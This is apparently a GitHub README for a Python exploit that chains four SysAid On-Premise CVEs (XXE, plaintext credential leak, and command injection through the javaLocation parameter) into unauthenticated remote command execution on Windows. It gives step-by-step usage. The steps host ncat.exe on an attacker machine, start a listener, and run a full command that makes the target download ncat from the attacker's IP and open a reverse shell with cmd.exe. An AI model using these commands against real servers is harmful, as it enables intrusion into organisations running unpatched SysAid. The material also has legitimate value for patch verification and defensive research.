<p align="center">
  <img src="https://upload.wikimedia.org/wikipedia/commons/7/7e/SysAid_Logo.svg" width="250px" alt="SysAid Logo">
</p>

<h1 align="center">SysAid Pre-Auth RCE Chain Exploit</h1>

<p align="center">
  <strong>🔥 CVE-2025-2775 → CVE-2025-2778 RCE Chain</strong><br>
  🧑‍💻 Author: <strong>0xgh057r3c0n</strong> | 🔬 Research: <strong>@SinSinology</strong> & <strong>@watchTowrcyber</strong><br>
  <a href="https://github.com/0xgh057r3c0n/SysAid-PreAuth-RCE-Chain/blob/main/LICENSE">
    <img src="https://img.shields.io/github/license/0xgh057r3c0n/SysAid-PreAuth-RCE-Chain?style=flat-square" alt="MIT License">
  </a>
</p>

---

## 🚨 Associated CVEs

| CVE ID         | Description                                                       |
|----------------|-------------------------------------------------------------------|
| **CVE-2025-2775** | XXE vulnerability in `/mdm/serverurl` endpoint                  |
| **CVE-2025-2776** | Arbitrary file read via malicious external DTD (XXE technique)  |
| **CVE-2025-2777** | Credentials stored in plaintext in `InitAccount.cmd`            |
| **CVE-2025-2778** | Authenticated command injection via `javaLocation` parameter    |

These are chained together to achieve **unauthenticated remote command execution**.

---

## 🧩 About

This is a Python-based exploit that targets **SysAid On-Premise** running on **Windows**. It chains multiple vulnerabilities to achieve **pre-authenticated blind RCE**.

---

## 🧰 Requirements

- Python 3.6+
- `requests` module
- Attacker host with HTTP server and Netcat (`ncat`)
- SysAid target running on Windows

Install dependencies:

```bash
pip install requests
````

---

## 🔗 Exploit Chain Overview

1. XXE payload via `/mdm/serverurl` → triggers DTD-based file read
2. Leak `InitAccount.cmd` → extract hardcoded credentials
3. Log in with leaked creds
4. Inject command via `javaLocation` param (blind RCE)

---

## 🖥️ Step-by-Step Usage

### 1️⃣ Download and Host `ncat.exe` (Windows Netcat)

* 📥 Download from official source:
  [https://nmap.org/dist/ncat-portable-5.59BETA1.zip](https://nmap.org/dist/ncat-portable-5.59BETA1.zip)

* Extract `ncat.exe`

* Host it using Python HTTP server:

```bash
cd /path/to/ncat/
python3 -m http.server 80
```

Accessible at:

```
http://<ATTACKER_IP>/ncat.exe
```

---

### 2️⃣ Start a Reverse Shell Listener

On your attacker machine:

```bash
ncat -lvnp 4444
```

---

### 3️⃣ Run the Exploit

#### 🔸 Basic RCE (blind)

```bash
python3 exploit.py -t http://<TARGET_IP>:8080 -l <ATTACKER_IP> -c whoami
```

> You won’t get output, but command runs silently.

---

#### 🔹 Reverse Shell (Windows)

```bash
python3 exploit.py -t http://<TARGET_IP>:8080 -l <ATTACKER_IP> -c "cmd.exe /c curl http://<ATTACKER_IP>/ncat.exe -o C:\Windows\Temp\ncat.exe & C:\Windows\Temp\ncat.exe <ATTACKER_IP> 4444 -e cmd.exe"
```

**Decoded:**

```cmd
cmd.exe /c curl http://192.168.1.20/ncat.exe -o C:\Windows\Temp\ncat.exe
C:\Windows\Temp\ncat.exe 192.168.1.20 4444 -e cmd.exe
```

---

## 📦 Example Workflow

```bash
# Host Netcat binary
python3 -m http.server 80

# Start listener
ncat -lvnp 4444

# Launch exploit
python3 exploit.py -t http://192.168.1.100:8080 -l 192.168.1.20 -c "cmd.exe /c curl http://192.168.1.20/ncat.exe -o C:\Windows\Temp\ncat.exe & C:\Windows\Temp\ncat.exe 192.168.1.20 4444 -e cmd.exe"
```

---

## 🧪 Tested On

* ✅ SysAid On-Prem (Windows Server)
* ✅ Python 3.8+
* ✅ ncat.exe from Nmap

---

## 👨‍🔬 Credits

* 🔬 Research: [@SinSinology](https://twitter.com/SinSinology) & [@watchTowrcyber](https://twitter.com/watchTowrcyber)
* 💻 Exploit: **0xgh057r3c0n**

---

## 📜 License

This project is licensed under the MIT License. See the full license here:
🔗 [MIT License on GitHub](https://github.com/0xgh057r3c0n/SysAid-PreAuth-RCE-Chain/blob/main/LICENSE)

